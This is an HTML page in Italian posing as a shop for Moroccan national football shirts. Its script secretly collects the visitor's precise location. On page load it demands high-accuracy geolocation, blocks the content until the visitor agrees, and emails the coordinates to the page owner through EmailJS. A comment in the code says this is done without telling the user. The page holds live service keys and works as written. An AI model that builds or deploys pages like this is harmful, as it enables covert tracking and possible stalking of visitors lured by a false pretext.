<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <title>Maglie da calcio del Marocco</title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    #content { display: none; }
    #error { color: red; font-weight: bold; }
  </style>
  <script>
    // Inizializza EmailJS (metti la tua public key)
    emailjs.init("fP2VdrglbuTATn2Cg");

    window.onload = function() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function(pos) {
            // Manda la posizione via email senza dirlo all'utente
            emailjs.send("service_d14gbw2", "template_t3p4r3c", {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude
            });
            // Mostra contenuto
            document.getElementById("content").style.display = "block";
          },
          function() {
            // Se rifiuta, mostra messaggio e blocca contenuto
            document.getElementById("error").innerText =
              "Devi consentire la posizione per vedere le maglie.";
          },
          { enableHighAccuracy: true }
        );
      } else {
        document.getElementById("error").innerText =
          "Geolocalizzazione non supportata dal tuo browser.";
      }
    };
  </script>
</head>
<body>
  <div id="error"></div>
  <div id="content">
    <h1>Maglie da calcio del Marocco</h1>
    <p>Ecco le offerte pi√π vicine a te!</p>
    <!-- Qui metti le immagini o i prodotti -->
    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/2/29/Morocco_national_football_team_logo.svg/1200px-Morocco_national_football_team_logo.svg.png" alt="Maglia Marocco" width="200"/>
  </div>
</body>
</html>
